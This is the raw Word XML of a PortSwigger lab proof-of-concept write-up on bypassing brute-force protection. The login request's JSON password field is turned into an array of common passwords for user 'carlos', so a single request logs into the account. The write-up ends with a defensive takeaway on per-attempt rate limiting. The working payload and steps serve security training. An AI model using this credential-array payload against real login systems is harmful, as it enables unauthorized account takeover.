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9540" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:t>PortSwigger Lab POC - 13-multiple-credentials-per-request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6628C3C4" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 13 — Broken brute-force protection, multiple credentials per request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CEF0E01" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00392005"/>
    <w:p w14:paraId="29F928B7" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>🎯 Objective</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="569BB1B2" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>The login endpoint accepts JSON arrays — send all passwords at once in a single request to bypass brute-force rate limiting.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DFCE2DD" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00392005"/>
    <w:p w14:paraId="59981306" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A1EA5BF" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00392005"/>
    <w:p w14:paraId="44C95EB0" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>🪜 Steps</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C4258A8" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00392005"/>
    <w:p w14:paraId="18501341" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 1 — Intercept the login request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52FF5F95" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Intercept `POST /login` → send to **Intruder** / **Repeater**.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A02AF19" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00392005"/>
    <w:p w14:paraId="44040F00" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2BA501B9" wp14:editId="743FEE3F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4053" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="53A3D122" wp14:editId="4E9AF512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9B5F" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00392005"/>
    <w:p w14:paraId="370588F1" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A636216" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00392005"/>
    <w:p w14:paraId="01B6CC59" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 2 — Modify the request body</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CCA2A74" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Change the JSON `password` field from a string to an **array** containing all passwords at once:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52CB7FDB" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00392005"/>
    <w:p w14:paraId="63F4CBA0" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>```json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41349583" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19589B02" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>"username": "carlos",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="773F5C16" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>"password": [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54BCB951" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>"123456",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="671E460B" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>"password",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F720A3C" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>"12345678",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24FF6B67" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>"qwerty",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75C80C75" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>"abc123",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1692CDA2" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>"letmein",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18E76D56" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>"football",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="015A398A" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>"iloveyou",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D5E0692" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>"admin",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B2F0C06" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>"welcome"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76ED004B" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>... (full password list)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D312D56" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62A53241" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7685C4BF" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>```</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04D9CB20" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00392005"/>
    <w:p w14:paraId="3252484B" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Send the request → **302 redirect** ✅</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19AC2B88" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00392005"/>
    <w:p w14:paraId="7D0EC26A" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="29B886B6" wp14:editId="2714BF6C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5DAF" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00392005"/>
    <w:p w14:paraId="1227E21C" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F1A165A" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00392005"/>
    <w:p w14:paraId="46D84DCA" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Step 3 — Access the account</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="732D2914" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Right-click the 302 response → **Show response in browser** → open the URL.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="268DD748" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00392005"/>
    <w:p w14:paraId="2A88B81A" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Logged in as Carlos!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A0B9A35" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00392005"/>
    <w:p w14:paraId="0A27B827" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="62005AC3" wp14:editId="42A6E473">
            <wp:extent cx="5303520" cy="15950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BED" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1796E20D" wp14:editId="126AD123">
            <wp:extent cx="5303520" cy="3115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FEF" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00392005"/>
    <w:p w14:paraId="35C9FFB0" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2162D0F1" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00392005"/>
    <w:p w14:paraId="66F66465" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>✅ Result</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15767566" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Lab solved in a **single request**!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C828372" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00392005"/>
    <w:p w14:paraId="35F9B1DD" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47293218" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00392005"/>
    <w:p w14:paraId="12738F26" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>💡 Key Takeaway</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="764762C4" w14:textId="77777777" w:rsidR="00392005" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Rate limiting must be enforced per-password attempt, not per-request. If the backend processes JSON arrays, each element must count as a separate attempt.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="003920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825164">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1035277272">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1073772429">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1942645825">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="2100518174">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="2002728552">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1960722926">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="335496723">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="134246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03F"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="00392005"/>
    <w:rsid w:val="009B76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DEBA"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{D87A646D-2CA5-4DC6-9CEB-D967E61D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2026-05-24T14:09:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>